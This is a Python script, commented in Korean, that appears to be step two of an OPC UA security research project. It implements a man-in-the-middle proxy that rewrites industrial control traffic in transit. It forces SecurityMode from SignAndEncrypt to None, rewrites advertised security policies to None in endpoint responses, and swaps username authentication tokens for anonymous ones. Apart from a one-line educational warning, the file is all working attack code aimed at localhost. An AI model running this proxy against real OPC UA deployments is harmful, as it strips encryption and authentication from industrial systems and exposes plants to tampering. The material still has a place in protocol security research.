#!/usr/bin/env python3
"""
Step 2: OPC UA Advanced MITM Proxy with Packet Manipulation
OpenSecureChannel 및 ActivateSession 메시지를 조작하여 보안 다운그레이드 공격 수행
"""
import sys
sys.path.insert(0, '/root/opcua-research/python-opcua-env/lib/python3.10/site-packages')

import socket
import threading
import struct
import time

class OPCUAAdvancedProxy:
    """패킷 변조 기능이 있는 OPC UA MITM 프록시"""
    
    def __init__(self, listen_port, target_host, target_port):
        self.listen_port = listen_port
        self.target_host = target_host
        self.target_port = target_port
        self.manipulation_log = []
        
    def start(self):
        """프록시 서버 시작"""
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind(('0.0.0.0', self.listen_port))
        server_socket.listen(5)
        
        print(f"Advanced MITM Proxy Started")
        print(f"   Listening: 0.0.0.0:{self.listen_port}")
        print(f"   Target: {self.target_host}:{self.target_port}")
        print()
        
        try:
            while True:
                client_socket, addr = server_socket.accept()
                print(f"Client connected: {addr}")
                
                thread = threading.Thread(
                    target=self.handle_client,
                    args=(client_socket,)
                )
                thread.daemon = True
                thread.start()
                
        except KeyboardInterrupt:
            print("\nProxy stopped")
        finally:
            server_socket.close()
    
    def handle_client(self, client_socket):
        """클라이언트 요청 처리"""
        try:
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.connect((self.target_host, self.target_port))
            
            print(f"   Connected to target server")
            
            self.relay_data(client_socket, server_socket)
            
        except Exception as e:
            print(f"   Error: {e}")
        finally:
            client_socket.close()
            try:
                server_socket.close()
            except:
                pass
    
    def relay_data(self, client_socket, server_socket):
        """데이터 중계 및 조작"""
        
        def forward(source, destination, direction):
            """데이터 전달 및 조작"""
            try:
                while True:
                    data = source.recv(4096)
                    if not data:
                        break
                    
                    # 패킷 조작
                    modified_data = self.manipulate_packet(data, direction)
                    
                    # 변조된 데이터 전달
                    destination.sendall(modified_data)
            except:
                pass
        
        c2s = threading.Thread(target=forward, args=(client_socket, server_socket, "C->S"))
        s2c = threading.Thread(target=forward, args=(server_socket, client_socket, "S->C"))
        
        c2s.daemon = True
        s2c.daemon = True
        
        c2s.start()
        s2c.start()
        
        c2s.join()
        s2c.join()
    
    def manipulate_packet(self, data, direction):
        """패킷 내용 조작"""
        if len(data) < 8:
            return data
        
        try:
            msg_type = data[:3]
            
            # OpenSecureChannelRequest 조작 (클라이언트->서버)
            if direction == "C->S" and msg_type == b'OPN':
                return self.manipulate_open_secure_channel(data)
            
            # GetEndpointsResponse 조작 (서버->클라이언트)
            if direction == "S->C" and b'GetEndpointsResponse' in data:
                return self.manipulate_get_endpoints_response(data)
            
            # ActivateSessionRequest 조작 (클라이언트->서버)
            if direction == "C->S" and b'ActivateSession' in data:
                return self.manipulate_activate_session(data)
                
        except Exception as e:
            pass
        
        return data
    
    def manipulate_open_secure_channel(self, data):
        """OpenSecureChannelRequest의 SecurityMode 변조"""
        try:
            # OPC UA 메시지 헤더 파싱
            # 오프셋 28-31: SecurityMode 필드 위치 (구현마다 다를 수 있음)
            if len(data) > 31:
                # SecurityMode 확인
                security_mode = struct.unpack('<I', data[28:32])[0]
                
                if security_mode == 0x03:  # SignAndEncrypt
                    print(f"   [MANIPULATION] OpenSecureChannel: SecurityMode")
                    print(f"      Original: 0x03 (SignAndEncrypt)")
                    print(f"      Modified: 0x01 (None)")
                    
                    # SecurityMode를 None으로 변경
                    modified = bytearray(data)
                    modified[28:32] = struct.pack('<I', 0x01)
                    
                    self.manipulation_log.append({
                        'timestamp': time.time(),
                        'type': 'OpenSecureChannel',
                        'field': 'SecurityMode',
                        'original': '0x03 (SignAndEncrypt)',
                        'modified': '0x01 (None)'
                    })
                    
                    return bytes(modified)
        except Exception as e:
            print(f"   Error manipulating OpenSecureChannel: {e}")
        
        return data
    
    def manipulate_get_endpoints_response(self, data):
        """GetEndpointsResponse에서 보안 정책 다운그레이드"""
        try:
            print(f"   [MANIPULATION] GetEndpointsResponse detected")
            
            # SecurityPolicyUri를 None으로 변경
            data_str = data.decode('latin-1', errors='ignore')
            
            if 'Basic256Sha256' in data_str or 'Basic128Rsa15' in data_str:
                print(f"      Attempting to downgrade security policies...")
                
                # 보안 정책 URI 변경 (간단한 문자열 치환)
                modified = data.replace(
                    b'http://opcfoundation.org/UA/SecurityPolicy#Basic256Sha256',
                    b'http://opcfoundation.org/UA/SecurityPolicy#None\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                )
                
                if modified != data:
                    print(f"      Security policy downgraded to None")
                    self.manipulation_log.append({
                        'timestamp': time.time(),
                        'type': 'GetEndpointsResponse',
                        'field': 'SecurityPolicyUri',
                        'original': 'Basic256Sha256',
                        'modified': 'None'
                    })
                    return modified
                    
        except Exception as e:
            print(f"   Error manipulating GetEndpointsResponse: {e}")
        
        return data
    
    def manipulate_activate_session(self, data):
        """ActivateSessionRequest의 UserIdentityToken 조작"""
        try:
            print(f"   [MANIPULATION] ActivateSession detected")
            
            # UserIdentityToken 타입 확인
            data_str = data.decode('latin-1', errors='ignore')
            
            if 'username' in data_str.lower():
                print(f"      Attempting to change UserIdentityToken...")
                
                # TokenType 변경: Username(1) -> Anonymous(0)
                # PolicyId 변경: "username_basic256sha256" -> "anonymous"
                modified = bytearray(data)
                
                # PolicyId 문자열 치환
                policy_search = b'username_basic256sha256'
                policy_replace = b'anonymous\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                
                if policy_search in modified:
                    idx = modified.find(policy_search)
                    modified[idx:idx+len(policy_replace)] = policy_replace
                    
                    print(f"      Original: TokenType=Username, PolicyId=username_basic256sha256")
                    print(f"      Modified: TokenType=Anonymous, PolicyId=anonymous")
                    
                    self.manipulation_log.append({
                        'timestamp': time.time(),
                        'type': 'ActivateSession',
                        'field': 'UserIdentityToken',
                        'original': 'Username/username_basic256sha256',
                        'modified': 'Anonymous/anonymous'
                    })
                    
                    return bytes(modified)
                    
        except Exception as e:
            print(f"   Error manipulating ActivateSession: {e}")
        
        return data
    
    def print_manipulation_summary(self):
        """변조 작업 요약 출력"""
        print("\n" + "="*70)
        print("MANIPULATION SUMMARY")
        print("="*70)
        
        if not self.manipulation_log:
            print("No manipulations performed")
            return
        
        print(f"Total manipulations: {len(self.manipulation_log)}")
        print()
        
        for i, log in enumerate(self.manipulation_log, 1):
            print(f"[{i}] {log['type']}")
            print(f"    Field: {log['field']}")
            print(f"    Original: {log['original']}")
            print(f"    Modified: {log['modified']}")
            print(f"    Time: {time.ctime(log['timestamp'])}")
            print()

def main():
    print("="*70)
    print("OPC UA Advanced MITM Proxy - Packet Manipulation")
    print("="*70)
    print()
    print("WARNING: For educational purposes only!")
    print()
    
    # Python opcua 서버 (4841)에 대한 프록시
    proxy = OPCUAAdvancedProxy(
        listen_port=14841,
        target_host='localhost',
        target_port=4841
    )
    
    print("Usage:")
    print("   1. Start this proxy")
    print("   2. Connect client to localhost:14841")
    print("   3. Proxy relays to localhost:4841")
    print("   4. Packets are analyzed and manipulated")
    print()
    
    print("Manipulation targets:")
    print("   - OpenSecureChannel: SecurityMode (0x03 -> 0x01)")
    print("   - GetEndpoints: SecurityPolicy (Basic256Sha256 -> None)")
    print("   - ActivateSession: UserIdentityToken (Username -> Anonymous)")
    print()
    
    try:
        proxy.start()
    except Exception as e:
        print(f"Error: {e}")
    finally:
        proxy.print_manipulation_summary()

if __name__ == "__main__":
    main()

